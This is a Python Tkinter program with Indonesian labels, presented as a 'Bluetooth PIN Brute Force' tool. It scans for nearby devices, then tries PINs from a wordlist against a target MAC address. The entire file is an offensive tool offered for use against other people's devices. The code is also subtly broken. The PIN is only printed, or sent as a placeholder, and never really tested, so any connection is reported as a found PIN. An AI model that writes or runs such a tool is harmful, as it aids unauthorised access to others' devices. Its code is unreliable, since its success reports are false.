import tkinter as tk
from tkinter import messagebox, filedialog, simpledialog
import threading
import platform
import asyncio  # Import asyncio for handling asynchronous operations

# Importing the correct Bluetooth library based on the OS
if platform.system() == "Windows":
    from bleak import BleakScanner, BleakClient
else:
    import bluetooth

# Fungsi pairing nyata menggunakan Bleak (untuk Bluetooth Low Energy)
async def real_bluetooth_pairing(target_mac, pin):
    try:
        client = BleakClient(target_mac)
        connected = await client.connect()
        if connected:
            # Placeholder for sending PIN or performing some interaction
            print(f"Connected to {target_mac}. Sending PIN: {pin}")
            await client.disconnect()
            return True
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def load_wordlist():
    filepath = filedialog.askopenfilename(title="Pilih Wordlist", filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
    if filepath:
        try:
            with open(filepath, "r") as file:
                content = file.read()
                entry_pins.delete("1.0", tk.END)
                entry_pins.insert(tk.END, content)
        except Exception as e:
            messagebox.showerror("Error", f"Gagal membuka file: {e}")

def start_bruteforce():
    target_mac = entry_mac.get().strip()
    pins = entry_pins.get("1.0", tk.END).strip().split("\n")

    log.delete("1.0", tk.END)
    found = False

    for pin in pins:
        pin = pin.strip()
        if not pin:
            continue
        log.insert(tk.END, f"Mencoba pairing ke {target_mac} dengan PIN: {pin}\n")
        log.see(tk.END)
        root.update()

        if platform.system() == "Windows":
            # Using Bleak for Windows (asynchronous)
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            if asyncio.run(real_bluetooth_pairing(target_mac, pin)):
                log.insert(tk.END, f"\n[+] PIN Ditemukan: {pin}\n")
                messagebox.showinfo("Sukses", f"PIN Ditemukan: {pin}")
                found = True
                return
        else:
            # For Linux, using pybluez
            if real_bluetooth_pairing_linux(target_mac, pin):
                log.insert(tk.END, f"\n[+] PIN Ditemukan: {pin}\n")
                messagebox.showinfo("Sukses", f"PIN Ditemukan: {pin}")
                found = True
                return

    if not found:
        log.insert(tk.END, "\n[-] Gagal menemukan PIN yang cocok.\n")
        messagebox.showwarning("Gagal", "Tidak ada PIN yang cocok.")

def run_in_thread():
    threading.Thread(target=start_bruteforce).start()

def scan_devices():
    log.delete("1.0", tk.END)
    log.insert(tk.END, "🔍 Scanning perangkat Bluetooth...\n")
    root.update()

    if platform.system() == "Windows":
        devices = asyncio.run(BleakScanner.discover())
        if devices:
            log.insert(tk.END, "\nDitemukan perangkat:\n")
            for device in devices:
                log.insert(tk.END, f"  {device.address} - {device.name}\n")
        else:
            log.insert(tk.END, "\nTidak ada perangkat ditemukan.\n")
    else:
        devices = bluetooth.discover_devices(duration=8, lookup_names=True)
        if devices:
            log.insert(tk.END, "\nDitemukan perangkat:\n")
            for addr, name in devices:
                log.insert(tk.END, f"  {addr} - {name}\n")
        else:
            log.insert(tk.END, "\nTidak ada perangkat ditemukan.\n")

# Fungsi pairing nyata menggunakan pybluez untuk Linux
def real_bluetooth_pairing_linux(target_mac, pin):
    try:
        service_matches = bluetooth.find_service(address=target_mac)
        if not service_matches:
            return False

        first_match = service_matches[0]
        port = first_match["port"]
        name = first_match["name"]
        host = first_match["host"]

        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        sock.connect((host, port))
        sock.send(pin)  # Dummy kirim PIN
        sock.close()
        return True

    except Exception as e:
        print(f"[!] Error: {e}")
        return False

# GUI setup
root = tk.Tk()
root.title("Bluetooth PIN Brute Force (by MAC)")
root.geometry("500x700")

label_mac = tk.Label(root, text="Target MAC Address (Bluetooth):")
label_mac.pack()
entry_mac = tk.Entry(root, width=40)
entry_mac.pack()
entry_mac.insert(0, "00:11:22:33:44:55")

label_pins = tk.Label(root, text="Daftar PIN (satu per baris):")
label_pins.pack()
entry_pins = tk.Text(root, height=5)
entry_pins.pack()
entry_pins.insert(tk.END, "0000\n1234\n1111\n4321")

btn_load_wordlist = tk.Button(root, text="Muat Wordlist dari File", command=load_wordlist)
btn_load_wordlist.pack(pady=5)

btn_start = tk.Button(root, text="Mulai Brute Force", command=run_in_thread)
btn_start.pack(pady=10)

btn_scan = tk.Button(root, text="Scan Perangkat Bluetooth di Sekitar", command=scan_devices)
btn_scan.pack(pady=10)

label_log = tk.Label(root, text="Log Percobaan:")
label_log.pack()
log = tk.Text(root, height=20)
log.pack()

root.mainloop()
